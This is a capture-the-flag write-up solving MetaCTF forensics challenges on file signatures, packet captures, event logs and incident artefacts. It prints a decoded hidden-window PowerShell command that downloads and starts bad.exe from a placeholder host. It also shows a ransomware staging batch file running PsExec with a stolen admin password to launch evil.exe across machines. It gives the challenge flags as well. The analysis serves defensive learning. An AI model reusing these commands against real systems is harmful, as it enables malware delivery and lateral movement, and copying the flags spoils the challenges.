# Forensics - 9 challenges
[Magic in the Hex (100 pts)](#magic-in-the-hex-100-pts)<br>
[My Logs Know What You Did (125 pts)](#my-logs-know-what-you-did-125-pts)<br>
[I Just Wanna Run (150 pts)](#i-just-wanna-run-150-pts)<br>
[Sharing Files and Passwords (150 pts)](#sharing-files-and-passwords-150-pts)<br>
[Still Believe in Magic? (150 pts)](#still-believe-in-magic-150-pts)<br>
[Et tu, Hacker? (200 pts)](#et-tu-hacker-200-pts)<br>
[Easy as it (TCP) Streams (250 pts)](#easy-as-it-tcp-streams-250-pts)<br>
[Pattern of Life (275 pts)](#pattern-of-life-275-pts) *no soln*<br>
[The Carver (475 pts)](#the-carver-475-pts) *no soln*<br>

## Magic in the Hex (100 pts)
> Sometimes in forensics, we run into files that have odd or unknown file extensions. In these cases, it's helpful to look at some of the file format signatures to figure out what they are. We use something called "magic bytes" which are the first few bytes of a file.
> 
> What is the ASCII representation of the magic bytes for a VMDK file? The flag format will be 3-4 letters (there are two correct answers).

Every file has a file header which tells the operating system what type of file it is. The file header is the first few bytes of the file, for example a GIF file:

```
$ file cat_hop.gif
cat_hop.gif: GIF image data, version 89a, 128 x 128

$ xxd cat_hop.gif
00000000: 4749 4638 3961 8000 8000 f700 0000 0000  GIF89a..........
```

Here we can see that the file header for GIF files is `GIF89a` and the magic bytes are `47 49 46 38 39 61`.

As we can see this [wikipedia page](https://en.wikipedia.org/wiki/List_of_file_signatures) tells us the same exact thing:

![Wikipedia page](https://i.imgur.com/7YmV7Kp.png)

We can then look for VMDK on the same page:

![Wikipedia page](https://i.imgur.com/0S2eGFp.png)

The magic bytes for VMDK are `4B 44 4D` or in ascii `KDM`.

<div align="center">

Flag:
```
KDM
```
[return to top](#top)</div>


## My Logs Know What You Did (125 pts)
> While investigating an incident, you identify a suspicious powershell command that was run on a compromised system ... can you figure out what it was doing?
> 
> `C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -noP -sta -w 1 -enc TmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudCkuRG93bmxvYWRGaWxlKCdodHRwOi8vTWV0YUNURntzdXBlcl9zdXNfc3Q0Z2luZ19zaXRlX2QwdF9jMG19L19iYWQuZXhlJywnYmFkLmV4ZScpO1N0YXJ0LVByb2Nlc3MgJ2JhZC5leGUn`

Looks like a simple powershell command. Dissecting the command:
- `-noP` is short for `-NoProfile`: Does not load a PowerShell profile.
- `-sta`: Starts PowerShell using a single-threaded apartment.
- `-w 1` is short for `-WindowStyle <WindowStyleType>`, in this case the type 1 is `Hidden`: Hides the PowerShell window.
- `-enc TmV..` is short for `-EncodedCommand <Base64EncodedCommand>`: Base64 encoded command.

Decoding the encoded command:
```
$ echo "TmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudCkuRG93bmxvYWRGaWxlKCdodHRwOi8vTWV0YUNURntzdXBlcl9zdXNfc3Q0Z2luZ19zaXRlX2QwdF9jMG19L19iYWQuZXhlJywnYmFkLmV4ZScpO1N0YXJ0LVByb2Nlc3MgJ2JhZC5leGUn" | base64 -d
New-Object System.Net.WebClient).DownloadFile('http://MetaCTF{super_sus_st4ging_site_d0t_c0m}/_bad.exe','bad.exe');Start-Process 'bad.exe'
```

We get the powershell script the command executes. It downloads `http://MetaCTF{super_sus_st4ging_site_d0t_c0m}/_bad.exe`, saves it as `bad.exe` and then runs it.

<div align="center">

Flag:
```
MetaCTF{super_sus_st4ging_site_d0t_c0m}
```
[return to top](#top)</div>


## I Just Wanna Run (150 pts)
> Our security team has identified evidence of ransomware deployment staging in the network. We’re trying to contain and remediate the malicious operator’s deployment staging and access before the operator successfully spreads and executes ransomware within the environment. We’ve recovered some of the operator’s [staging scripts and files](https://metaproblems.com/57fc877af48ad294da5e527eca2649a5/incident017.zip). Can you help identify which user account’s credentials the operator had compromised and is planning to use to execute the ransomware?
> 
> The flag format will be `METAL\xxxxx`

Downloading the zip and unzipping it, we see the following files:

```
$ ls
incident017  __MACOSX

$ cd incident017/

$ ls
 inventory.txt  'recovered files'  'user accounts.txt'
```

Lets check out `inventory.txt`:

```
$ cat inventory.txt | head
original filepath

included in zip:
C:\share$\COPY.bat
C:\share$\EXE.bat
C:\share$\WMI.bat
C:\share$\comps1.txt
C:\share$\comps2.txt
C:\share$\comps3.txt
C:\share$\comps4.txt
```

Hm, `exe.bat` seems interesting. Lets look into that:

```
$ cd 'recovered files'/

$ ls
comps10.txt  comps12.txt  comps14.txt  comps16.txt  comps1.txt  comps3.txt  comps5.txt  comps7.txt  comps9.txt  exe.bat
comps11.txt  comps13.txt  comps15.txt  comps17.txt  comps2.txt  comps4.txt  comps6.txt  comps8.txt  copy.bat    wmi.bat

$ cat exe.bat | head
start PsExec.exe -d @C:\share$\comps1.txt -u METAL\timq-admin> -p “Fall2021!” cmd /c c:\windows\temp\evil.exe
start PsExec.exe -d @C:\share$\comps2.txt -u METAL\timq-admin> -p “Fall2021!” cmd /c c:\windows\temp\evil.exe
start PsExec.exe -d @C:\share$\comps3.txt -u METAL\timq-admin> -p “Fall2021!” cmd /c c:\windows\temp\evil.exe
start PsExec.exe -d @C:\share$\comps4.txt -u METAL\timq-admin> -p “Fall2021!” cmd /c c:\windows\temp\evil.exe
start PsExec.exe -d @C:\share$\comps5.txt -u METAL\timq-admin> -p “Fall2021!” cmd /c c:\windows\temp\evil.exe
start PsExec.exe -d @C:\share$\comps6.txt -u METAL\timq-admin> -p “Fall2021!” cmd /c c:\windows\temp\evil.exe
start PsExec.exe -d @C:\share$\comps7.txt -u METAL\timq-admin> -p “Fall2021!” cmd /c c:\windows\temp\evil.exe
start PsExec.exe -d @C:\share$\comps8.txt -u METAL\timq-admin> -p “Fall2021!” cmd /c c:\windows\temp\evil.exe
start PsExec.exe -d @C:\share$\comps9.txt -u METAL\timq-admin> -p “Fall2021!” cmd /c c:\windows\temp\evil.exe
start PsExec.exe -d @C:\share$\comps10.txt -u METAL\timq-admin> -p “Fall2021!” cmd /c c:\windows\temp\evil.exe
```

I suspect that this is the user account that was compromised. And we can see the user was `METAL\timq-admin`.

<div align="center">

Flag:
```
METAL\timq-admin
```
[return to top](#top)</div>


## Sharing Files and Passwords (150 pts)
> FTP servers are made to share files, but if its communications are not encrypted, it might be sharing passwords as well. The password in [this pcap](https://metaproblems.com/2dd6443361555f266a8c2f54c50d01e9/ftp_challenge.pcapng) to get the flag

Given a pcap file, we can see the following:

![pcap](https://i.imgur.com/FBP2T5b.png)

We're given a hint about FTP connections. So lets sort by FTP:

![pcap](https://i.imgur.com/xIB0Vj6.png)

As we know FTP traffic is in plaintext, and here we can see that someone was trying to login, lets examine those packets:

![pcap](https://i.imgur.com/d8SA6y5.png)

And it looks like we found the exchange between the user signing in and the server:

![pcap](https://i.imgur.com/z07QSCW.png)

You can see the password on the 4th line.

<div align="center">

Flag:
```
ftp_is_better_than_dropbox
```
[return to top](#top)</div>


## Still Believe in Magic? (150 pts)
> We found [an archive with a file in it](https://metaproblems.com/f03e38955de03e3d860d32dfd20b132f/magic.tar.gz), but there was no file extension so we're not sure what it is. Can you figure out what kind of file it is and then open it?

Download the file and unzip it:

```
$ tar -xvzf magic.tar.gz
magic
```

We got a file called `magic`, lets run a file check on it:

```
$ file magic
magic: Zip archive data, at least v2.0 to extract, compression method=deflate
```

Seems easy enough, lets unzip it again

```
$ unzip magic
Archive:  magic
  inflating: magic.txt
   creating: __MACOSX/
  inflating: __MACOSX/._magic.txt
```

Lets check out the `magic.txt` file:

```
$ cat magic.txt
MetaCTF{was_it_a_magic_trick_or_magic_bytes?}
```

<div align="center">

Flag:
```
MetaCTF{was_it_a_magic_trick_or_magic_bytes?}
```
[return to top](#top)</div>


## Et tu, Hacker? (200 pts)
> The law firm of William, Ian, Laura, and Lenny (WILL for short) has just been the victim of an attempted cyber attack. Someone tried to brute force the login for one of their employees. They have the [event logs](https://metaproblems.com/aa50297520b4159c83a31f5fe8f9cdeb/bruteforce.evtx) of the incident, and were wondering if you could tell them which user was targeted. Flag is in the form of MetaCTF{}.

Looks like we were given a `.evtx` file, which is a Microsoft Event Log file. We can easily open this in Windows Event Viewer:

![evtx](https://i.imgur.com/Ksw0l5O.png)

Now, we need to look for some suspicious activity, specifically logon attempts as the problem told us someone was trying to brute force login. With this knowledge lets look for repeated logon attempts.

Doing this I found a block of login attempts (note the time between each login attempt):

![evtx](https://i.imgur.com/jQ422bE.png)

Looking in the details section of the event we see that a login was attempted for the user `ericm`.

![evtx](https://i.imgur.com/HMdmayO.png)

Pretty much all the logs in this area are attempts to login into the account `ericm`. This must be the account that was targeted.

<div align="center">

Flag:
```
MetaCTF{ericm}
```
[return to top](#top)</div>


## Easy as it (TCP) Streams (250 pts)
> Caleb was designing a problem for MetaCTF where the flag would be in the telnet plaintext. Unfortunately, he accidentally stopped the [packet capture](https://metaproblems.com/46dc63e7dbfa1ca757a459063dff0959/easy_as_it_streams.pcapng) right before the flag was supposed to be revealed. Can you still find the flag? Note: You'll need to decrypt in CyberChef rather than using a command line utility.

We're given a pcap file, so lets first take a look at the different packets. Immediately we see 3 different streams:

![pcap](https://i.imgur.com/KrGeW7T.png)

Lets follow the first TCP stream:

![pcap](https://i.imgur.com/aRy3knh.png)

Looks like a PGP message, so we now know to look for a private key and a private key passphrase. Lets check the next TCP stream:

![pcap](https://i.imgur.com/QShqmZ9.png)

Looks like the private key, now we need to find the private key passphrase. Lets take a look at the telnet stream:

![pcap](https://i.imgur.com/Qn1DNiW.png)

Interesting, lets filter by client data:

![pcap](https://i.imgur.com/aRlxQuQ.png)

We can see they executed `gpgp --batch --yes --passphrase farnha message.pgp`. From here we can clearly see the passphrase is `farnha`.

Lets dump it into [Cyberchef](https://cyberchef.org/):

![cyberchef](https://i.imgur.com/E6rCQoy.png)

Bit of random text, but Cyberchef recommends we run `gunzip` on the output, doing so we get the flag:

![cyberchef](https://i.imgur.com/epjA45y.png)

<div align="center">

Flag:
```
MetaCTF{cleartext_private_pgp_keys}
```
[return to top](#top)</div>


## Pattern of Life (275 pts)
> Hackers have breached our network. We know they are there, hiding in the shadows as users continue to browse the web like normal. As a threat hunter, your job is to constantly be searching our environment for any signs of malicious behavior.
> 
> Today you just received [a packet capture (pcap)](https://static.metaproblems.com/2a641db1c19526efb7e0c99004ccba0d/pattern_of_life.pcapng) from a user's workstation. We think that an attacker may have compromised the user's machine and that the computer is beaconing out to their command and control (C2) server. Based on some other logs, we also think the attacker was *not* using a fully encrypted protocol and also did not put much care into making their C2 server look like a normal website. Your task? We'd like you to submit the port number that the C2 server is listening on in the form of `MetaCTF{portnumber}` as the flag.

<div align="center">

Flag:
```
NOT SOLVED YET
```
[return to top](#top)</div>


## The Carver (475 pts)
> Okay the more we look into this adversary in our networks, the more we realize we need to step up our analysis game. Additionally, our company's senior management are demanding we provide them more details. Are we hacked? What's the damage? What did the hacker do on the compromised machines?
> 
> Let's dive into that last question some more. We've taken [a process dump of the infected process](https://metaproblems.com/f375cac9432877ac046c0d2a2a39b156/the_carver.7z) for you. It seems that the attacker tasked their beacon to perform 4 different actions on the host. If you can extract out their payloads, then you'll find a special mark the attacker left behind (it is surrounded by `MetaCTF{}` so it will be obvious when you find it). While it won't be easy, we have faith that you're up to the task!

<div align="center">

Flag:
```
NOT SOLVED YET
```
[return to top](#top)</div>
